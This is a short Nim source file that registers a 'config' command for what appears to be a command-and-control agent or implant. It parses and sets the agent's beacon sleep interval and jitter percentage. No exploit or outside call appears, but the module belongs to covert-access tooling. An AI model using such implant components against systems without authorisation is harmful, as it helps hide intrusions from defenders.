import std/[json, strutils]
import core/types
import commands/registry

proc configExecute(taskId: string, params: JsonNode, state: AgentState,
                   send: SendMsg): TaskResult =
  var changed: seq[string] = @[]

  let intervalStr = params{"sleep"}.getStr("").strip()
  if intervalStr.len > 0:
    try:
      state.sleepInterval = parseInt(intervalStr)
      changed.add("sleep=" & $state.sleepInterval & "s")
    except ValueError as e:
      return TaskResult(output: "Invalid sleep value: " & e.msg,
                        status: "error", completed: true)

  let jitterStr = params{"jitter"}.getStr("").strip()
  if jitterStr.len > 0:
    try:
      state.jitter = parseInt(jitterStr)
      changed.add("jitter=" & $state.jitter & "%")
    except ValueError as e:
      return TaskResult(output: "Invalid jitter value: " & e.msg,
                        status: "error", completed: true)

  if changed.len == 0:
    return TaskResult(
      output: "Current config: sleep=" & $state.sleepInterval & "s  jitter=" & $state.jitter & "%",
      status: "success",
      completed: true,
    )
  return TaskResult(output: "Updated: " & changed.join("  "),
                    status: "success", completed: true)

proc initConfig*() =
  register("config", configExecute)
